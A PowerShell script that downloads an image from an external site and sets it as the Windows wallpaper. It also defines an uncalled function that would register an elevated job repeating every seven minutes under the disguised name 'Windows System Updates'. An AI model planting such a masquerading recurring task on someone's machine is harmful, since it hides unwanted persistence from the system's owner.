#Add-Type @"
#using System;
#using System.Runtime.InteropServices;
#using Microsoft.Win32;
#namespace Wallpaper
#{
#   public enum Style : int
#   {
#       Tile, Center, Stretch, NoChange, Fit
#   }
#   public class Setter {
#      public const int SetDesktopWallpaper = 20;
#      public const int UpdateIniFile = 0x01;
#      public const int SendWinIniChange = 0x02;
#      [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
#      private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
#      public static void SetWallpaper ( string path, Wallpaper.Style style ) {
#         SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
#         RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
#         switch( style )
#         {
#            case Style.Stretch :
#               key.SetValue(@"WallpaperStyle", "2") ; 
#               key.SetValue(@"TileWallpaper", "0") ;
#               break;
#            case Style.Fit :
#               key.SetValue(@"WallpaperStyle", "6") ; 
#               key.SetValue(@"TileWallpaper", "0") ;
#               break;
#            case Style.Center :
#               key.SetValue(@"WallpaperStyle", "1") ; 
#               key.SetValue(@"TileWallpaper", "0") ; 
#               break;
#            case Style.Tile :
#               key.SetValue(@"WallpaperStyle", "1") ; 
#               key.SetValue(@"TileWallpaper", "1") ;
#               break;
#            case Style.NoChange :
#               break;
#         }
#         key.Close();
#      }
#   }
#}
#"@

$setwallpapersrc = @"
using System.Runtime.InteropServices;
public class wallpaper
{
public const int SetDesktopWallpaper = 20;
public const int UpdateIniFile = 0x01;
public const int SendWinIniChange = 0x02;
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
public static void SetWallpaper ( string path )
{
SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
}
}
"@
Add-Type -TypeDefinition $setwallpapersrc

#        function SetWallpaper ($ImagePath) 
#       {
#           $RegPath = "HKCU:\Control Panel\Desktop"
#           $update = $true
#
#           Write-Host $ImagePath
#
#           If(HasValue(Get-ItemProperty -Path $RegPath -Name "WallPaper"))
#           {
#               #Get-ItemProperty -Path $RegPath -Name "WallPaper"
#               Set-ItemProperty -Path $RegPath -Name "WallPaper" -Value $ImagePath
#           }
#           else
#           {
#               Write-Host "CRAP"
#               $update = $false
#           }
#
#           If(HasValue(Get-ItemProperty -Path $RegPath -Name "WallpaperStyle"))
#           {
#               Set-ItemProperty -Path $RegPath -Name "WallpaperStyle" -Value 6
#           }
#           else
#           {
#               Write-Host "FUCK"
#               $update = $false
#           }
#
#           If(HasValue(Get-ItemProperty -Path $RegPath -Name "TileWallpaper"))
#           {
#               #Get-ItemProperty -Path $RegPath -Name "TileWallpaper"
#               Set-ItemProperty -Path $RegPath -Name "TileWallpaper" -Value 0
#           }
#           else
#           {
#               Write-Host "SHIT"
#               $update = $false
#           }
#
#           if($update)
#           {
#               $SetDesktopWallpaper = 20;
#               $UpdateIniFile = 0x01;
#               $SendWinIniChange = 0x02;
#               Write-Host "Updating"
#               SystemParametersInfo( $SetDesktopWallpaper, 0, $ImagePath, $UpdateIniFile | $SendWinIniChange )
#               RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
#           }
#       }

#       function HasValue($value)
#       {
#           if($value -ne $null)
#           {
#               return $true
#           }
#           return $false
#       }
#
        function DownloadImage()
        {
            $seconds = Get-Date -UFormat %S
            try
            {
                $imageNum = $seconds.Substring(1)
            }
            catch
            {
                $imageNum = 0
            }

            $imageName = "$imageNum.jpg"

            if(Test-Path -Path "$Env:Temp\\$imageName")
            {
                Remove-Item -Path "$Env:Temp\\$imageName"
            }
  
            $imageURL = "http://540s7.com/pics/$imageName"
            Write-Host $imageURL
            (new-object System.Net.WebClient).DownloadFile($imageURL,"$Env:Temp\\$imageName");

            return $imageName
        }

function ScheduleScript()
{
    $repeat = (New-TimeSpan -Minutes 7)
    $jobname = "Windows System Updates"
    $action = New-ScheduledTaskAction -Execute 'Powershell.exe' 
    $trigger = New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval $repeat
    $options = New-ScheduledJobOption -RunElevated -ContinueIfGoingOnBattery -StartIfOnBattery
    Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger -ScheduledJobOption $options
}

$file = DownloadImage
#[Wallpaper.Setter]::SetWallpaper("$Env:Temp\$file", 4)
[wallpaper]::SetWallpaper("$Env:Temp\$file")
#[wallpaper]::SetWallpaper("h:\Quotefancy-1542-3840x2160.jpg") 